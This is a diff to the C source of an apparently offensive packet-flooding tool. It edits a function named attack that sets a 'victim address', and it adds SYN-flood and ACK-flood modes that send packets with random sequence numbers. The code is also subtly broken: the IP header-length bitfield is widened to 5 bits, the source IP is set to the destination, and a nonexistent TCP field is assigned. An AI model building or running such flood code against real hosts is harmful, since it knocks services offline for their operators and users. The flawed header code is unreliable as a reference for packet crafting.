@@ -80,7 +80,7 @@ unsigned int pktcount = 0, pktsent = 0;
 // IP Packet Structure.
 struct ip
 {
-    unsigned int ip_hl : 4;         /* header length */
+    unsigned int ip_hl : 5;         /* header length */
     unsigned int ip_v : 4;          /* version */
     unsigned char ip_tos;           /* type of service */
     unsigned short ip_len;          /* total length */
@@ -95,7 +95,6 @@ struct ip
 // TCP Packet Structure.
 struct tcp
 {
-
     unsigned short th_sport;        /* source port */
     unsigned short th_dport;        /* destination port */
     unsigned int th_seq;            /* sequence number */
@@ -283,8 +282,7 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
     xf_tcphdr->th_off = sizeof(struct tcphdr) / 4;
 
     // Randomize TCP window
-    //xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
-    xf_tcphdr->th_win = htons(0); // Instead set it to zero, for testing purposes.
+    xf_tcphdr->th_win = htons(65535);
 
     // Set TTL
     xf_iphdr->ip_ttl = TCP_TTL_MAX;
@@ -293,10 +291,22 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
     // pkt 1: ack=0 seq=rand
     // pkt2: ack=rand seq=oldseq+1
 
-    xf_tcphdr->th_flags = 2;
-    xf_tcphdr->th_seq = htonl(rand_cmwc());
-    xf_tcphdr->th_ack = htonl(0);
-
+    switch (mode)
+    {
+        case 1:
+        {
+            xf_tcphdr->th_flags = 2;
+            xf_tcphdr->th_seq = htonl(rand_cmwc());
+            xf_tcphdr->th_ack = htonl(0);
+            break;
+        }
+        case 2:
+        {
+            xf_tcphdr->th_flags = 16;
+            xf_tcphdr->th_seq = htonl(rand_cmwc());
+            xf_tcphdr->th_ack = htonl(rand_cmwc());
+        }
+    }
     // Set victim address and port.
     xf_iphdr->ip_src.s_addr = dest;
     xf_tcphdr->th_src.s_addr = dest;
